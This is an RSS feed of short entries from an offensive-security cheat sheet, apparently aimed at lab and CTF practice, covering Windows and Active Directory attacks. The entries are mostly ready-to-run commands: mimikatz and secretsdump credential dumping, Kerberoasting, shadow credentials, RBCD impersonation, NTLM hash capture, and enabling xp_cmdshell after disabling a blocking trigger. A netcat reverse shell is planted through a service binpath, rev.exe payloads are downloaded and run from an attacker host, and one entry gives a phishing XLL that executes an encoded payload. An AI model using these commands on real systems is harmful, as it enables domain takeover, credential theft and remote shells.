channel.title: Windows on TLDRBins
channel.description: Recent content in Windows on TLDRBins

item.title: Abuse Parent Child Domain Trusts
item.description: Privesc from DA (Domain Admin) to EA (Enterprise Admin) Windows 1. Check trust relationships # Get all trusted domain objects in a forest Get-ADTrust -Filter * # Returns a list of trusted domains nltest /domain_trusts # Gets a collection of the trust relationships of the current forest ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() 2. Get current and target domain SID ./mimikatz.exe 'lsadump::trust' 'exit' 3. Get krbtgt hash of current domain ./mimikatz.exe 'lsadump::dcsync /all /csv' 'exit' 4.

item.title: Account Operators
item.description: Privesc #1: Create a new user account and add it to LAPS (Local Administrator Password Solution) group Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = "<DOMAIN>\<USER>" $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Create new user password object $new_user_password = ConvertTo-SecureString <NEW_USER_PASSWORD> -AsPlainText -Force 4. Create new user account # Create a new user New-AdUser <NEW_USER> -enabled $true -accountpassword $new_user_password -Credential $cred # Grant new user privilege (e.

item.title: AD Recycle Bin
item.description: Privesc #1: Restore deleted AD account Windows 1. Import AD module import-module activedirectory 2. Query all deleted objects within domain Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects 3. Get all details for the deleted account Get-ADObject -filter { SAMAccountName -eq "<DELETED_USER>" } -includeDeletedObjects -property * 4. Restore deleted account # Rename the target account to avoid user exist error Restore-ADObject -Identity <ObjectGUID> -NewName <NEW_USER> -TargetPath "CN=Users,DC=<EXAMPLE>,DC=<COM>"

item.title: ADCS
item.description: Enum (From Linux) certipy-ad nxc certipy-ad find -u <USER> -p <PASSWORD> -target <TARGET> -text -stdout -vulnerable nxc ldap <TARGET> -u <USER> -p <PASSWORD> -M adcs Enum (From Windows) powershell certify ADCSTemplate # Check ADCS service net start | findstr /i cert # Check env certutil # List cert templates certutil -catemplates # Get info of each template .\certify.exe find # Find vuln templates .\certify.exe find /vulnerable /currentuser import-module .\ADCSTemplate.psm1 get-adcstemplate | fl displayname Ref: ADCSTemplate

item.title: AddKeyCredentialLink
item.description: Privesc #1: Shadow credentials Linux Windows 0. Pre-check [optional] python3 pywhisker.py --action list -d <DOMAIN> -u <CURRENT_USER> -p <PASSWORD> --dc-ip <DC> -t <TARGET_USER> --use-ldaps 1. Add shadow credentials python3 pywhisker.py --action add -d <DOMAIN> -u <CURRENT_USER> -p <PASSWORD> --dc-ip <DC> -t <TARGET_USER> --use-ldaps # Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type' pip3 install -I pyopenssl==24.0.0 2. Request TGT using PFX file sudo ntpdate -s <DC> && python3 gettgtpkinit.py -cert-pfx <PFX_FILE> -pfx-pass <PFX_PASSWORD> <DOMAIN>/<USERNAME> <USERNAME>.

item.title: AddSelf
item.description: Privesc #1: Add self to group (From Linux) powerview.py bloodyAD # Connect sudo ntpdate -s <DC> && powerview <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET_DOMAIN> # Add self to group Add-DomainGroupMember -Identity <TARGET_GROUP> -Members <USERNAME> # Check Get-DomainGroupMember -Identity <TARGET_GROUP> # Exit and login again to apply changes Add-DomainObjectAcl -TargetIdentity <ANOTHER_GROUP> -PrincipalIdentity <USERNAME> -Rights fullcontrol # Check Get-DomainObjectAcl -Identity <TARGET_USER_IN_ANOTHER_GROUP> -Where "SecurityIdentifier contains <USERNAME>" Ref: powerview.py # Add self to group python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> add groupMember <TARGET_GROUP> <USERNAME> # After getting full control of target group (e.

item.title: AllowedToDelegate
item.description: Privesc #1: Forge a Ticket Linux Windows # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s <DC> && impacket-getST -dc-ip <DC_IP> -spn www/dc.example.com -hashes :<HASH> -impersonate Administrator <DOMAIN>/<USER> # Export ccache export KRB5CCNAME=Administrator.ccache # Remote sudo ntpdate -s <DC> && wmiexec.py -k -no-pass administrator@dc.example.com Note: impacket-wmiexec may not work TO-DO

item.title: Alternate Data Stream
item.description: Show ADS Windows # cmd cmd /C dir /R \Windows\Tasks\example.txt # powershell Get-Item -Path \Windows\Tasks\example.txt -force -stream *

item.title: Bloodhound
item.description: Info Collection (From Linux) bloodhound-python # With Creds bloodhound-python -d <DOMAIN> -u <USER> -p <PASSWORD> -dc <DC> -ns <DC_IP> -c all --zip # With Kerberos sudo ntpdate -s <DC> && bloodhound-python -u <USER> -p <PASSWORD> -k -d <DOMAIN> -dc <DC> -ns <DC_IP> -c all --zip Info Collection (From Windows) SharpHound.exe SharpHound.ps1 .\SharpHound.exe -c all --outputdirectory C:\ProgramData # Import module . .\SharpHound.ps1 # Run Invoke-BloodHound -CollectionMethods All -OutputDirectory C:\ProgramData Ref: sharphound.

item.title: Built-in Group
item.description: Abuse #1. Modify Service Path # Start a nc listener rlwrap nc -lvnp 443 Windows # Assumed nc.exe is uploaded sc.exe config VSS binpath="C:\ProgramData\nc.exe -e cmd 10.10.14.10 443" # Stop service sc.exe stop VSS # Start service sc.exe start VSS

item.title: Bypass ASMI
item.description: evil-winrm payloads menu Bypass-4MSI Note: have to run menu first Amsi-Bypass-Payloads

item.title: Compressed Files
item.description: Hint: Always put the zip file inside a new folder before unzip zip tar.gz tar gz rar 7z bz # zip a file zip file.zip file # zip a folder zip -r folder.zip folder/ # zip a symlink (not the destination file) zip --symlinks file.zip symlink # List files without unzip unzip -l file.zip # unzip unzip file.zip # unzip (Windows) Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('C:\ProgramData\file.zip', 'C:\ProgramData\') # Compress a file tar -cvzf file.

item.title: Constrained Delegation
item.description: Abuse #1: RBCD Attack Linux 1. Find delegation sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k impacket-getST -spn <SERVICE>/<DC> -impersonate administrator '<DOMAIN>/<USERNAME>' -hashes :<HASH> -self # Check forwardable flag describeTicket.py <TICKET_1>.ccache 2. RBCD # Add delegation impacket-rbcd '<DOMAIN>/<USERNAME>' -hashes :<HASH> -k -delegate-from <USERNAME> -delegate-to <TARGET_1> -action write -dc-ip <DC> -use-ldaps # Check sudo ntpdate -s <DC> && impacket-findDelegation '<DOMAIN>/<USERNAME>' -dc-ip <DC> -hashes :<HASH> -k # Impersonate impacket-getST '<DOMAIN>/<USERNAME>:<PASSWORD>' -spn <SERVICE>/<DC> -impersonate <TARGET_2> # Check forwardable flag describeTicket.

item.title: Cross Session Relay
item.description: Display information about the session host Windows qwinsta * # Or runas .\RunasCs.exe x x qwinsta -l 9 Abuse #1: Steal NTLM hash RemotePotato0 KrbRelay # In local Linux sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.10.11.10:9999 # Trigger Attack .\RemotePotato0.exe -m 2 -s <TARGET_SESSION_ID> -x 10.10.14.10 -p 9999 Ref: RemotePotato0 .\KrbRelay.exe -session <TARGET_SESSION_ID> -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm # Or runas .\RunasCs.exe x x -l 9 "C:\ProgramData\KrbRelay.exe -session <TARGET_SESSION_ID> -clsid 0ea79562-d4f6-47ba-b7f2-1e9b06ba16a4 -ntlm" Ref: KrbRelay

item.title: dotnet
item.description: Compile C# project Linux # Check dotnet --info # Prepare mkdir <PROJECT_NAME> cd <PROJECT_NAME> # Init dotnet new console # Create .sln file dotnet new sln # Link .sln to .csproj dotnet sln <PROJECT_NAME>.sln add <PROJECT_NAME>.csproj # Add dependencies (optional) dotnet add package System.XXXX.XXXX.XXXX --version 1.0.0 +----------------------+ |Add Code to Program.cs| +----------------------+ # Build solution dotnet build -c Release # Run dotnet run Ref: dotnet

item.title: DPAPI
item.description: Abuse #1: Auto dump (From Linux) Linux DonPAPI collect -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -t <TARGET> Ref: DonPAPI Abuse #1: Auto dump (From Windows) mimikatz SharpDPAPI 1. Info Gathering cmd /c "dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Vault & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Credentials & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Local\Microsoft\Protect & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Vault & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials & dir /S /AS C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Protect" 2. Secrets Dump mimikatz.exe "token::elevate" "!+" "!processprotect /process:lsass.exe /remove" "dpapi::cred /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>"' '"dpapi::masterkey /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Protect\<SID>\<PROTECT_HASH> /sid:<SID> /password:<PASSWORD> /protected"' '"dpapi::cred /in:C:\Users\<TARGET_UESR>\AppData\Roaming\Microsoft\Credentials\<CREDENTIALS_HASH>"' "exit" # Run as system .

item.title: evil-winrm
item.description: Connection Methods Password Hash Kerberos crt & key evil-winrm -i <TARGET> -u <USER> -p <PASSWORD> evil-winrm -i <TARGET> -u <USER> -H <HASH> # Step 1: Edit '/etc/krb5.conf' [libdefaults] default_realm = <DOMAIN> [realms] <DOMAIN> = { kdc = <DC>:88 admin_server = <DC> default_domain = <DOMAIN> } [domain_realm] .domain.internal = <DOMAIN> domain.internal = <DOMAIN> # Step 2: export .ccache export KRB5CCNAME=<CCACHE> # Step 3: Connect sudo ntpdate -s <DC> && evil-winrm -i <TARGET> -r <DC> evil-winrm -i <TARGET> -S -k auth.

item.title: ExecuteDCOM
item.description: Abuse #1: ExecuteDCOM Linux # Revshell impacket-dcomexec <DOMAIN>/<USERNAME>:<PASSWORD>@<TARGET> '<powershell #3 Base64>' -silentcommand -object MMC20

item.title: File Transfer (Linux to Windows)
item.description: CMD Powershell evil-winrm Start a Local HTTP Server python3 -m http.server 80 certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe # Upload and Run certutil -urlcache -split -f http://10.10.14.10/rev.exe C:\ProgramData\rev.exe && C:\ProgramData\rev.exe Start a Local HTTP Server python3 -m http.server 80 # Long version Invoke-WebRequest http://10.10.14.10/rev.exe -OutFile C:\ProgramData\rev.exe # Short version iwr http://10.10.14.10/rev.exe -o C:\ProgramData\rev.exe Note: PowerShell 3.0+ # Long version powershell.exe -ExecutionPolicy bypass curl 10.10.14.10/rev.exe -o C:\ProgramData\rev.exe # Short version powershell -ep bypass curl 10.

item.title: File Transfer (Windows To Linux)
item.description: SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\10.10.14.10\share # Connect to SMB server with creds net use \\10.10.14.10\share /u:<USER> <PASSWORD> # From target Windows to local Linux copy example.txt \\10.10.14.10\share # From local Linux to target Windows copy \\10.10.14.10\share\example.txt example.txt # Delete file del example.txt # Remove SMB share net use /d \\10.10.14.10\share # Older Windows (e.

item.title: Find (Windows)
item.description: Windows Show hidden files Get-ChildItem -force Find a file ls -path \Users -Filter example.txt -recurse -erroraction silent where /R C:\Users example.txt Find a file, with rules dir /s /b /a:-d-h \Users\Administrator | findstr /i /v "appdata" +---------------------------------------+ |dir: | |/s : include subfolders | |/b : bare format | |/a:-d-h : exclude directories or hidden| | | |findstr: | |/i : case insensitive | |/v appdata : exclude 'appdata' | +---------------------------------------+

item.title: Firewall (Windows)
item.description: Windows Check Firewall Rules # cmd cmd /c "netsh advfirewall firewall show rule name=all|findstr Name:" # powershell Get-NetFirewallProfile # Check outbound rules Get-NetFirewallRule -Direction Outbound -Enabled True # Pretty Print powershell -c "Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName,@{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}},@{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}},@{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}},@{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Enabled, Profile,Direction,Action" Add Inbound Rules # Allow all inbound traffic from local subnet New-NetFirewallRule -DisplayName "Allow All" -Direction Inbound -Enabled True -RemoteAddress LocalSubnet -Action Allow -Protocol TCP -Profile ANY

item.title: ForceChangePassword
item.description: Change target user password (From Linux) BloodyAD rpcclient python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD> Ref: bloodyAD rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <TARGET_USER_NEW_PASSWORD>' Change target user password (From Windows) Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Change Target User Password $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force Set-DomainUserPassword -Identity <TARGET_USER> -AccountPassword $password

item.title: GenericAll
item.description: Abuse #1: Change target user password Linux Windows 0. Install latest impacket (included dacledit.py) [optional] git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add Full Control to current user [optional] dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=EXAMPLE,DC=COM' -inheritance -action write -rights FullControl 2. Change password BloodyAD python3 bloodyAD.py -d <DOMAIN> -u <USERNAME> -p <PASSWORD> --host <DC> set password <TARGET_USER> <NEW_PASSWORD> Ref: bloodyAD 1. Import PowerView.ps1 . .

item.title: GenericWrite
item.description: Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Check target user Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers <DOMAIN>/<USER> -no-pass -dc-ip <DC> Abuse #2 : Kerberoasting by adding spn Windows 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = "<DOMAIN>\<USER>" $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.

item.title: GetChanges/GetChangesAll
item.description: Abuse #1: DCSync Attack Linux Windows # With creds impacket-secretsdump -just-dc <USER>:<PASSWORD>@<TARGET> # With hashes impacket-secretsdump -hashes <LM>:<NT> -just-dc <DOMAIN>/<USER>@<TARGET> .\mimikatz.exe 'lsadump::dcsync /domain:<DOMAIN> /user:administrator' exit

item.title: GPOs
item.description: Abuse #1: Add local admin 1. List GPOs Name Get-GPO -All | Select-Object DisplayName 2. Add localAdmin .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount <USER> --GPOName <GPO_NAME> 3. Force reload gpupdate /force Ref: SharpGPOAbuse

item.title: IIS
item.description: IIS Version +---------------------------------------------------------------------------------+ | Version Start Date End Date | +---------------------------------------------------------------------------------+ | IIS 10 on Windows Server 2019 Nov 13, 2018 Jan 9, 2029 | | IIS 10 on Windows Server (Semi-Annual Channel) Oct 17, 2017 | | IIS 10 on Windows Server 2016 Oct 15, 2016 Jan 12, 2027 | | IIS 10 on Windows 10 Pro Jul 29, 2015 | | IIS 10 on Windows 10, Enterprise and Education Jul 29, 2015 | | IIS 8.

item.title: Kerberoasting
item.description: AS_REP Roasting Impacket nxc # Multiple valid usernames impacket-GetNPUsers <DOMAIN>/ -usersfile usernames.txt -no-pass -dc-ip <DC> # Single user without creds impacket-GetNPUsers -no-pass -dc-ip 10.10.11.10 <DOMAIN>/<USER> # Multiple valid usernames (nxc) nxc ldap 10.10.11.10 -u usernames.txt -p '' --asreproast as_rep_hashes.txt Kerberoasting (From Linux) Impacket nxc # Fix time skew sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP> Note: Times skew have to be within 5 minutes in kerberos

item.title: Kerberos
item.description: Users enum kerbrute kerbrute userenum --domain <DOMAIN> --dc <DC> usernames.txt Ref: kerbrute Usernames generator username-anarchy ./username-anarchy -i users.txt | tee usernames.txt Ref: username-anarchy Generate Kerberos ticket (From Linux) Impacket Kinit sudo ntpdate -s <DC> && impacket-getTGT -hashes :<HASH> <DOMAIN>/administrator export KRB5CCNAME=administrator.ccache # Check ticket klist # Step 0: Installation sudo apt install krb5-user cifs-utils # Step 1: Add domain controller to '/etc/hosts' (Try different order if not work) 10.10.11.10 <DC> <DOMAIN> # Step 2: Add domain controller as a DNS server to '/etc/resolv.

item.title: Krbrelayx
item.description: Abuse #1: Add Active Directory Integrated DNS records via LDAP Linux # Capture NTLM hash sudo responder -I tun0 python3 dnstool.py -u <DOMAIN>\\<USER> -p <PASSWORD> --action add --record test --data 10.10.14.10 --type A 10.10.11.10 Ref: krbrelayx tools

item.title: LDAP
item.description: Enum nmap ldapdomaindump ldapsearch # Using nmap script sudo nmap -p 389 --script ldap-search <TARGET> # Using ldapdomaindump (With Creds) ldapdomaindump -u '<DOMAIN>\<USER>' -p <PASSWORD> <TARGET> -o ./ldap # Get domain base ldapsearch -x -H ldap://10.10.11.10 -s base namingcontexts # Get all from domain ldapsearch -x -H ldap://10.10.11.10 -b 'DC=<EXAMPLE>,DC=<COM>' # Just get a class (e.g. person) ldapsearch -x -H ldap://10.10.11.10 -b 'DC=<EXAMPLE>,DC=<COM>' '(objectClass=person)' # With creds (e.g. john.appleseed) ldapsearch -x -H ldap://10.

item.title: Machine Account
item.description: Abuse #1: Microsoft virtual account 1. Create a ticket from Microsoft virtual account Windows .\rubeus.exe tgtdeleg /nowrap /ptt 2. Secrets Dump Linux Windows 3. Convert kirbi to ccache python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache 4. Secrets Dump export KRB5CCNAME=secrets.ccache sudo ntpdate -s <DC> && impacket-secretsdump -k -no-pass -just-dc-user administrator Ref: RubeusToCcache TO-DO

item.title: Metasploit
item.description: msfconsole meterpreter Start msfconsole msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter

item.title: Microsoft Access Database
item.description: Tools mdbtools sudo apt install mdbtools Basic # Show all tables mdb-tables database.mdb # Show tables with data mdb-tables database.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export database.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done # Dump data from table mdb-export database.mdb <TABLE_NAME>

item.title: Microsoft Oulook Email Folder
item.description: Open email file .pst .msg Tools sudo apt install readpst Basic # Convert to mbox format readpst emails.pst # Open .mbox (plaintext) cat emails.mbox Read many emails # Install mutt sudo apt install mutt # Open in mutt terminal mutt -Rf emails.mbox +--------------------------------------+ | Note: Answer No to create /root/Mail | | | | Arrow : Move to the email | | Enter : View email | | q : back | | q again : quit | +--------------------------------------+ Tools # Install msgconvert sudo apt install libemail-outlook-message-perl # Install formail sudo apt install procmail Basic # Convert to .

item.title: MSSQL Agent Jobs
item.description: 1. Pre-check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions('<PRINCIPAL>', 'USER'); # Fix : Cannot resolve the collation conflict between "Latin1_General_CI_AI" and "SQL_Latin1_General_CP1_CI_AS" SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions('<PRINCIPAL>', 'USER'); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check proxy account name and permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN='<PRINCIPAL>'; INSERT proxies EXEC msdb.

item.title: MSSQL General
item.description: General Connect to MSSQL DB Linux Windows impacket-mssqlclient '<USER>:<PASSWORD>@<TARGET>' # Without TLS impacket-mssqlclient -windows-auth '<USER>:<PASSWORD>@<TARGET>' # With inline query sqlcmd -S <TARGET> -U <USER> -P <PASSWORD> -d <DB_NAME> -Q "SELECT @@version;" Basic Commands # Check mssql version SELECT @@version; # Check users SELECT name FROM master..syslogins # Check users SELECT name FROM master..syslogins WHERE sysadmin = '1'; # Check service name and the account authorized to control the service SELECT servicename, service_account FROM sys.

item.title: MSSQL Linked Servers
item.description: Basic Commands Hint: Use double '' to escape ' in mssql # Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE ('select @@version;') at [<LINKED_SERVER>]; # Execute query from linked server to current server EXECUTE ('EXECUTE (''SELECT entity_name, permission_name FROM fn_my_permissions(NULL, ''''SERVER'''');'') at [<CURRENT_SERVER>]') at [<LINKED_SERVER>]; Abuse #1: Create Admin User from Privilege Linked Server EXECUTE('EXECUTE(''CREATE LOGIN <USER> WITH PASSWORD = ''''<PASSWORD>'''';'') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>] EXECUTE('EXECUTE(''EXEC sp_addsrvrolemember ''''<USER>'''', ''''sysadmin'''''') AT [<CURRENT_SERVER>]') AT [<LINKED_SERVER>]

item.title: MSSQL Privilege Escalation
item.description: Abuse #1: Steal NTLM hash # In our local Linux machine sudo responder -I tun0 Method 1 Method 2 Method 3 xp_dirtree '\\10.10.14.10\any\thing'; use master; exec xp_dirtree '\\10.10.14.10\any\thing'; load_file('\\10.10.14.10\any\thing'); Abuse #2: Run xp_cmdshell # Check any policy blocking xp_cmdshell select name from sys.server_triggers; # Disable trigger if any disable trigger ALERT_xp_cmdshell on all server; # Enable xp_cmdshell enable_xp_cmdshell; # RCE xp_cmdshell whoami Abuse #3: Impersonate sa to run xp_cmdshell execute as login = 'sa'; exec sp_configure 'show advanced options', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1; execute as login = 'sa'; reconfigure; execute as login = 'sa'; EXEC master.

item.title: NetExec (nxc)
item.description: Basic Commands # Single user and password nxc smb 10.10.11.10 -u <USER> -p <PASSWORD> # Single user and password (Active Directory) nxc smb -u <USER> -p <PASSWORD> -d <DOMAIN> -dc-ip <DC_IP> # Multiple users or passwords nxc smb -u usernames.txt -p <PASSWORD> -d <DOMAIN> -dc-ip <DC_IP> --continue-on-success # Match username to corresponding password nxc smb 10.10.11.10 -u usernames.txt -p passwords.txt --no-bruteforce --continue-on-success # With LM Hash:NT Hash nxc smb 10.

item.title: Network Discovery
item.description: Test connectivity Linux Windows # Default infinite pings ping -c3 10.10.11.10 # Default 5 pings ping 10.10.11.10 # Check specific port Test-NetConnection <TARGET> -Port 5985 Test reverse connectivity Linux sudo tcpdump -ni tun0 icmp Sniff network traffic Linux # For example: on port 389 sudo tcpdump -i lo -nnXs 0 'port 389' # Sniff HTTPS traffic sudo ./mitmdump -p 443 --mode reverse:https://example.com --ssl-insecure --set flow_detail=3 Ref: mitmproxy Use ping to scan subnet Linux for i in $(seq 1 254); do (ping -c 1 10.

item.title: NTLM Relay Attack
item.description: 1. Run socat to redirect traffic (In Windows Target) # Upload socat.zip and unzip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('c:\programdata\socat.zip', 'c:\programdata') .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:10.10.14.10:80 Ref: socat 2. Enable webdav (In Windows Target) $Source = @" using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.

item.title: Phishing
item.description: lnk xll hta scf odt pdf others $obj = New-Object -ComObject WScript.Shell $link = $obj.CreateShortcut("C:\ProgramData\Calculator.lnk") $link.TargetPath = "C:\ProgramData\rev.exe" $link.Save() shell.c #include <windows.h> __declspec(dllexport) void __cdecl xlAutoOpen(void); void __cdecl xlAutoOpen() { // Triggers when Excel opens WinExec("<PowerShell #3 Base64 Payload>", 1); // Replace your payload } BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } 1.

item.title: RBCD Attack
item.description: RBCD Attack Linux Windows 0. Check machine account quota nxc ldap 10.10.11.10 -u <USER> -p <PASSWORD> -M MAQ 1. Add a fake computer impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'password' -dc-ip 10.10.11.10 <DOMAIN>/<USER>:<PASSWORD> 2. Rbcd attack impacket-rbcd -delegate-to <TARGET_COMPUTER>$ -delegate-from EvilComputer$ -dc-ip <DC> -action 'write' <DOMAIN>/<USER>:<PASSWORD> 3. Impersonate sudo ntpdate -s <DC> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC> '<DOMAIN>/EvilComputer:password' 4. Import ticket export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache 5. Post-Attack # Remote sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass # Or secretsdump impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator 1.

item.title: ReadGMSAPassword
item.description: Abuse #1: Read GMSAPassword (From Linux) gMSADumper BloodyAD nxc python3 gMSADumper.py -u <USER> -p <PASSWORD> -l <TARGET> -d <DOMAIN> Ref: gMSADumper python3 bloodyAD.py -d <DOMAIN> -u <USER> -p <PASSWORD> --host <DC> get object <TARGET_OBJECT> --attr msDS-ManagedPassword Ref: bloodyAD nxc ldap -u <USER> -p <PASSWORD> -d <DOMAIN> <TARGET> --gmsa Abuse #2: Save as Cred Windows $gmsa = Get-ADServiceAccount -Identity <TARGET_NAME> -Properties 'msDS-ManagedPassword' $mp = $gmsa.'msDS-ManagedPassword' $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).

item.title: ReadLAPSPassword
item.description: Abuse #1: Read LAPS Password Linux Windows ldapsearch -h 10.10.11.10 -b 'DC=<,example>,DC=<com>' -x -D <USER>@<TARGET> -w <PASSWORD> "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 1. Import PowerView.ps1 . .\PowerView.ps1 2. Create cred object (runas) [optional] $username = "<DOMAIN>\<USER>" $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Read LAPS password Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred

item.title: RPC
item.description: Remote Procedure Call Tools rpcclient impacket # Connect without creds rpcclient -U '' -N 10.10.11.10 # Connect with creds rpcclient -U <DOMAIN>/<USER>%<PASSWORD> 10.10.11.10 # Inline execute command rpcclient -U <DOMAIN>/<USER>%<PASSWORD> 10.10.11.10 -c 'querydispinfo' Basic Commands # General info querydispinfo # List of users enumdomusers # List of groups enumdomgroups # Query group by rid querygroup <RID> # Query group member by rid querygroupmem <RID> # Query user by rid queryuser <RID> # Look up a user lookupnames <USER> # Look up by SID lookupsids <SID> impacket-lookupsid <USER>:<PASSWORD>@<TARGET>

item.title: Runas
item.description: Create credential object Method #1 Method #2 $username = '<DOMAIN>\<USER>' $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force $cred = New-Object System.Management.Automation.PSCredential($username, $password) $username = '<DOMAIN>\<USER>' $password = '<PASSWORD>' $secstr = New-Object -TypeName System.Security.SecureString $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)} $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr Runas (with cred object) Invoke-Command PSSession Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost # If error, try Invoke-Command -ScriptBlock { C:\ProgramData\rev.exe } -Credential $cred -Computer localhost -auth credssp # Invoke command with config Invoke-Command -ScriptBlock { C:\ProgramData\rev.

item.title: Scheduled tasks
item.description: Check scheduled tasks Windows schtasks /query # List details schtasks /TN \Microsoft\Windows\<FOLDER>\<TASKNAME> /FO LIST /V

item.title: SeBackupPrivilege/SeRestorePrivilege
item.description:
Abuse #1: Robocopy # For example robocopy /b <TARGET_DIR_PATH> C:\Windows\Tasks <TARGET_FILE> Abuse #2: Using helper dlls import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege <TARGET_FILE_PATH> C:\ProgramData\<TARGET_FILE> # For example Copy-FileSeBackupPrivilege C:\Windows
tds
